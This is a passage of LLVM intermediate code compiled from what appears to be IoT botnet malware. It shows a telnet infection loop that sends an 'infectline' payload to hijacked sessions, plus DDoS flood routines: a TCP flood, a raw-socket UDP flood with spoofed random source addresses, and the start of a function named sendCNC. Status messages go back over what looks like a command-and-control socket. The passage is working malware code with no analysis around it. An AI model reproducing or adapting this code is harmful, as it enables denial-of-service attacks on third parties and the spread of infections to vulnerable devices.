963:                                              ; preds = %951
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 6
  %968 = load i32, i32* %967, align 4
  %969 = add i32 %968, 20
  %970 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %971 = icmp ult i32 %969, %970
  br i1 %971, label %972, label %987

972:                                              ; preds = %963
  %973 = load i32, i32* %2, align 4
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %974
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %975, i32 0, i32 0
  %977 = load i32, i32* %976, align 16
  %978 = call i32 @sclose(i32 noundef %977)
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 2
  store i8 0, i8* %982, align 8
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 3
  store i8 1, i8* %986, align 1
  br label %987

987:                                              ; preds = %972, %963
  br label %1085

988:                                              ; preds = %69
  %989 = load i32, i32* %2, align 4
  %990 = sext i32 %989 to i64
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %990
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %991, i32 0, i32 0
  %993 = load i32, i32* %992, align 16
  %994 = call i64 @send(i32 noundef %993, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %995 = icmp slt i64 %994, 0
  br i1 %995, label %996, label %1011

996:                                              ; preds = %988
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 0
  %1001 = load i32, i32* %1000, align 16
  %1002 = call i32 @sclose(i32 noundef %1001)
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 2
  store i8 0, i8* %1006, align 8
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 3
  store i8 1, i8* %1010, align 1
  br label %1086

1011:                                             ; preds = %988
  %1012 = load i32, i32* %2, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 2
  store i8 8, i8* %1015, align 8
  br label %1085

1016:                                             ; preds = %69
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 6
  %1021 = load i32, i32* %1020, align 4
  %1022 = icmp eq i32 %1021, 0
  br i1 %1022, label %1023, label %1029

1023:                                             ; preds = %1016
  %1024 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 6
  store i32 %1024, i32* %1028, align 4
  br label %1029

1029:                                             ; preds = %1023, %1016
  %1030 = load i32, i32* %2, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 0
  %1034 = load i32, i32* %1033, align 16
  %1035 = load i8*, i8** @infectline, align 8
  %1036 = load i8*, i8** @infectline, align 8
  %1037 = call i64 @strlen(i8* noundef %1036) #11
  %1038 = call i64 @send(i32 noundef %1034, i8* noundef %1035, i64 noundef %1037, i32 noundef 16384)
  %1039 = icmp slt i64 %1038, 0
  br i1 %1039, label %1040, label %1060

1040:                                             ; preds = %1029
  %1041 = load i32, i32* %2, align 4
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1042
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1043, i32 0, i32 0
  %1045 = load i32, i32* %1044, align 16
  %1046 = call i32 @sclose(i32 noundef %1045)
  %1047 = load i32, i32* %2, align 4
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1048
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1049, i32 0, i32 2
  store i8 0, i8* %1050, align 8
  %1051 = load i32, i32* %2, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 3
  store i8 1, i8* %1054, align 1
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 8
  %1059 = load i8*, i8** %1058, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1059, i8 0, i64 1024, i1 false)
  br label %1086

1060:                                             ; preds = %1029
  %1061 = load i32, i32* %2, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 6
  %1065 = load i32, i32* %1064, align 4
  %1066 = add i32 %1065, 15
  %1067 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1068 = icmp ult i32 %1066, %1067
  br i1 %1068, label %1069, label %1084

1069:                                             ; preds = %1060
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 0
  %1074 = load i32, i32* %1073, align 16
  %1075 = call i32 @sclose(i32 noundef %1074)
  %1076 = load i32, i32* %2, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 2
  store i8 0, i8* %1079, align 8
  %1080 = load i32, i32* %2, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 3
  store i8 1, i8* %1083, align 1
  br label %1084

1084:                                             ; preds = %1069, %1060
  br label %1085

1085:                                             ; preds = %1084, %1011, %987, %839, %775, %634, %570, %394, %232, %69
  br label %1086

1086:                                             ; preds = %1085, %1040, %996, %945, %920, %892, %824, %801, %724, %710, %619, %596, %514, %477, %440, %319, %185, %141
  %1087 = load i32, i32* %2, align 4
  %1088 = add nsw i32 %1087, 1
  store i32 %1088, i32* %2, align 4
  br label %65, !llvm.loop !43

1089:                                             ; preds = %65
  br label %63
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendSTD(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #12
  store i32 %12, i32* %7, align 4
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* noundef %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* noundef %22, i8* noundef %24, i64 noundef %28) #12
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

37:                                               ; preds = %57, %3
  %38 = load i32, i32* %11, align 4
  %39 = icmp uge i32 %38, 50
  br i1 %39, label %40, label %57

40:                                               ; preds = %37
  %41 = load i32, i32* %7, align 4
  %42 = call i64 @send(i32 noundef %41, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i64 0, i64 0), i64 noundef 50, i32 noundef 0)
  %43 = load i32, i32* %7, align 4
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %45 = call i32 @connect(i32 noundef %43, %struct.sockaddr* noundef %44, i32 noundef 16)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %47 = sext i32 %46 to i64
  %48 = load i64, i64* %8, align 8
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = add nsw i64 %48, %50
  %52 = icmp sge i64 %47, %51
  br i1 %52, label %53, label %56

53:                                               ; preds = %40
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @close(i32 noundef %54)
  call void @_exit(i32 noundef 0) #14
  unreachable

56:                                               ; preds = %40
  store i32 0, i32* %11, align 4
  br label %57

57:                                               ; preds = %56, %37
  %58 = load i32, i32* %11, align 4
  %59 = add i32 %58, 1
  store i32 %59, i32* %11, align 4
  br label %37
}

declare %struct.hostent* @gethostbyname(i8* noundef) #3

; Function Attrs: nounwind
declare void @bcopy(i8* noundef, i8* noundef, i64 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendUDP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i64, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %8, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %6
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %6
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 noundef zeroext %38) #15
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* noundef %42, %struct.in_addr* noundef %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %270

47:                                               ; preds = %41
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = load i32, i32* %12, align 4
  store i32 %50, i32* %14, align 4
  %51 = load i32, i32* %10, align 4
  %52 = icmp eq i32 %51, 32
  br i1 %52, label %53, label %105

53:                                               ; preds = %47
  %54 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #12
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %60, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* @mainCommSock, align 4
  %59 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %58, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %270

60:                                               ; preds = %53
  %61 = load i32, i32* %11, align 4
  %62 = add nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = call noalias i8* @malloc(i64 noundef %63) #12
  store i8* %64, i8** %16, align 8
  %65 = load i8*, i8** %16, align 8
  %66 = icmp eq i8* %65, null
  br i1 %66, label %67, label %68

67:                                               ; preds = %60
  br label %270

68:                                               ; preds = %60
  %69 = load i8*, i8** %16, align 8
  %70 = load i32, i32* %11, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %69, i8 0, i64 %72, i1 false)
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* noundef %73, i32 noundef %74)
  %75 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %75, %76
  store i32 %77, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %78

78:                                               ; preds = %101, %100, %68
  %79 = load i32, i32* %15, align 4
  %80 = load i8*, i8** %16, align 8
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %84 = call i64 @sendto(i32 noundef %79, i8* noundef %80, i64 noundef %82, i32 noundef 0, %struct.sockaddr* noundef %83, i32 noundef 16)
  %85 = load i32, i32* %18, align 4
  %86 = load i32, i32* %14, align 4
  %87 = icmp eq i32 %85, %86
  br i1 %87, label %88, label %101

88:                                               ; preds = %78
  %89 = load i32, i32* %8, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %95

91:                                               ; preds = %88
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %93, i16* %94, align 2
  br label %95

95:                                               ; preds = %91, %88
  %96 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %97 = load i32, i32* %17, align 4
  %98 = icmp sgt i32 %96, %97
  br i1 %98, label %99, label %100

99:                                               ; preds = %95
  br label %104

100:                                              ; preds = %95
  store i32 0, i32* %18, align 4
  br label %78

101:                                              ; preds = %78
  %102 = load i32, i32* %18, align 4
  %103 = add i32 %102, 1
  store i32 %103, i32* %18, align 4
  br label %78

104:                                              ; preds = %99
  br label %270

105:                                              ; preds = %47
  %106 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #12
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %112, label %109

109:                                              ; preds = %105
  %110 = load i32, i32* @mainCommSock, align 4
  %111 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %110, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %270

112:                                              ; preds = %105
  store i32 1, i32* %20, align 4
  %113 = load i32, i32* %19, align 4
  %114 = bitcast i32* %20 to i8*
  %115 = call i32 @setsockopt(i32 noundef %113, i32 noundef 0, i32 noundef 3, i8* noundef %114, i32 noundef 4) #12
  %116 = icmp slt i32 %115, 0
  br i1 %116, label %117, label %120

117:                                              ; preds = %112
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %118, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i64 0, i64 0))
  br label %270

120:                                              ; preds = %112
  store i32 50, i32* %21, align 4
  br label %121

121:                                              ; preds = %125, %120
  %122 = load i32, i32* %21, align 4
  %123 = add nsw i32 %122, -1
  store i32 %123, i32* %21, align 4
  %124 = icmp ne i32 %122, 0
  br i1 %124, label %125, label %130

125:                                              ; preds = %121
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %127 = call i32 @rand_cmwc()
  %128 = xor i32 %126, %127
  call void @srand(i32 noundef %128) #12
  %129 = call i32 @rand() #12
  call void @init_rand(i32 noundef %129)
  br label %121, !llvm.loop !44

130:                                              ; preds = %121
  %131 = load i32, i32* %10, align 4
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %134

133:                                              ; preds = %130
  store i32 0, i32* %22, align 4
  br label %140

134:                                              ; preds = %130
  %135 = load i32, i32* %10, align 4
  %136 = sub nsw i32 32, %135
  %137 = shl i32 1, %136
  %138 = sub nsw i32 %137, 1
  %139 = xor i32 %138, -1
  store i32 %139, i32* %22, align 4
  br label %140

140:                                              ; preds = %134, %133
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 28, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %23, align 8
  %145 = alloca i8, i64 %143, align 16
  store i64 %143, i64* %24, align 8
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %25, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.udphdr*
  store %struct.udphdr* %150, %struct.udphdr** %26, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %22, align 4
  %156 = call i32 @getRandomIP(i32 noundef %155)
  %157 = call i32 @htonl(i32 noundef %156) #15
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 8, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %151, i32 noundef %154, i32 noundef %157, i8 noundef zeroext 17, i32 noundef %161)
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 8, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 noundef zeroext %165) #15
  %167 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.1* %168 to %struct.anon.2*
  %170 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %169, i32 0, i32 2
  store i16 %166, i16* %170, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon.1* %174 to %struct.anon.2*
  %176 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %175, i32 0, i32 0
  store i16 %172, i16* %176, align 2
  %177 = load i32, i32* %8, align 4
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %181

179:                                              ; preds = %140
  %180 = call i32 @rand_cmwc()
  br label %186

181:                                              ; preds = %140
  %182 = load i32, i32* %8, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 noundef zeroext %183) #15
  %185 = zext i16 %184 to i32
  br label %186

186:                                              ; preds = %181, %179
  %187 = phi i32 [ %180, %179 ], [ %185, %181 ]
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.1* %190 to %struct.anon.2*
  %192 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %191, i32 0, i32 1
  store i16 %188, i16* %192, align 2
  %193 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon.1* %194 to %struct.anon.2*
  %196 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %195, i32 0, i32 3
  store i16 0, i16* %196, align 2
  %197 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %198 = bitcast %struct.udphdr* %197 to i8*
  %199 = getelementptr inbounds i8, i8* %198, i64 8
  %200 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* noundef %199, i32 noundef %200)
  %201 = bitcast i8* %145 to i16*
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 2
  %204 = load i16, i16* %203, align 2
  %205 = zext i16 %204 to i32
  %206 = call zeroext i16 @csum(i16* noundef %201, i32 noundef %205)
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 7
  store i16 %206, i16* %208, align 2
  %209 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %210 = load i32, i32* %9, align 4
  %211 = add nsw i32 %209, %210
  store i32 %211, i32* %27, align 4
  store i32 0, i32* %28, align 4
  br label %212

212:                                              ; preds = %265, %264, %186
  br label %213

213:                                              ; preds = %212
  %214 = load i32, i32* %19, align 4
  %215 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %216 = call i64 @sendto(i32 noundef %214, i8* noundef %145, i64 noundef %143, i32 noundef 0, %struct.sockaddr* noundef %215, i32 noundef 16)
  %217 = call i32 @rand_cmwc()
  %218 = trunc i32 %217 to i16
  %219 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 0
  %221 = bitcast %union.anon.1* %220 to %struct.anon.2*
  %222 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %221, i32 0, i32 0
  store i16 %218, i16* %222, align 2
  %223 = load i32, i32* %8, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %227

225:                                              ; preds = %213
  %226 = call i32 @rand_cmwc()
  br label %232

227:                                              ; preds = %213
  %228 = load i32, i32* %8, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 noundef zeroext %229) #15
  %231 = zext i16 %230 to i32
  br label %232

232:                                              ; preds = %227, %225
  %233 = phi i32 [ %226, %225 ], [ %231, %227 ]
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.1* %236 to %struct.anon.2*
  %238 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %237, i32 0, i32 1
  store i16 %234, i16* %238, align 2
  %239 = call i32 @rand_cmwc()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 3
  store i16 %240, i16* %242, align 4
  %243 = load i32, i32* %22, align 4
  %244 = call i32 @getRandomIP(i32 noundef %243)
  %245 = call i32 @htonl(i32 noundef %244) #15
  %246 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 8
  store i32 %245, i32* %247, align 4
  %248 = bitcast i8* %145 to i16*
  %249 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 2
  %251 = load i16, i16* %250, align 2
  %252 = zext i16 %251 to i32
  %253 = call zeroext i16 @csum(i16* noundef %248, i32 noundef %252)
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 7
  store i16 %253, i16* %255, align 2
  %256 = load i32, i32* %28, align 4
  %257 = load i32, i32* %14, align 4
  %258 = icmp eq i32 %256, %257
  br i1 %258, label %259, label %265

259:                                              ; preds = %232
  %260 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %261 = load i32, i32* %27, align 4
  %262 = icmp sgt i32 %260, %261
  br i1 %262, label %263, label %264

263:                                              ; preds = %259
  br label %268

264:                                              ; preds = %259
  store i32 0, i32* %28, align 4
  br label %212

265:                                              ; preds = %232
  %266 = load i32, i32* %28, align 4
  %267 = add i32 %266, 1
  store i32 %267, i32* %28, align 4
  br label %212

268:                                              ; preds = %263
  %269 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %269)
  br label %270

270:                                              ; preds = %268, %117, %109, %104, %67, %57, %46
  ret void
}

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @srand(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #8

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendCNC(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
